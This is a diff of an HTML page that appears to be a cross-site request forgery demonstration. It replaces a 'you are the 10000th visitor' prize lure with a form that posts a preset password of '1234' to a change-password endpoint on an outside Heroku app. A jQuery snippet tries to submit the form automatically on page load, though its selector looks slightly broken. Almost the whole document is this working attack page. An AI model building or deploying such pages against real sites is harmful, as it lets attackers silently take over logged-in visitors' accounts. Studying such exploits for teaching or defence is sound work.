@@ -9,12 +9,36 @@
   </head>
 
   <body>
-    <div class="container">
-      <div class="jumbotron">
-        <h1>You are the 10000th visitor</h1>
-        <p class="lead">You have a chance to win something. All you have to do is click the WIN! button below!</p>
-        <p class="text-center"><a class="btn btn-lg btn-success" href="#" role="button">WIN!</a></p>
+<div class="container">
+  <h1>Change password</h1>
+<div class="panel panel-default login-panel">
+  <div class="panel-body">
+    <form method="post" class="form-horizontal" action="http://silver-quire.herokuapp.com/change-password">
+      <div class="form-group">
+        <label for="password" class="col-sm-4 control-label">Password</label>
+        <div class="col-sm-4">
+          <input id="password_confirmation" type="password" name="user[password]" class="form-control" value="1234"/>
+        </div>
       </div>
+      <div class="form-group">
+        <label for="password_confirmation" class="col-sm-4 control-label">Confirm password</label>
+        <div class="col-sm-4">
+          <input id="password_confirmation" type="password" name="user[password_confirmation]" class="form-control" value="1234"/>
+        </div>
+      </div>
+      <div class="form-group">
+        <div class="col-sm-offset-4 col-sm-4">
+          <button type="submit" class="btn btn-primary">Change!</button>
+        </div>
+      </div>
+    </form>
+  </div>
+</div>
+<script>
+$(document).ready(function () {
+	$('submit').trigger('click');
+});
+</script>
   </body>
 </html>
 
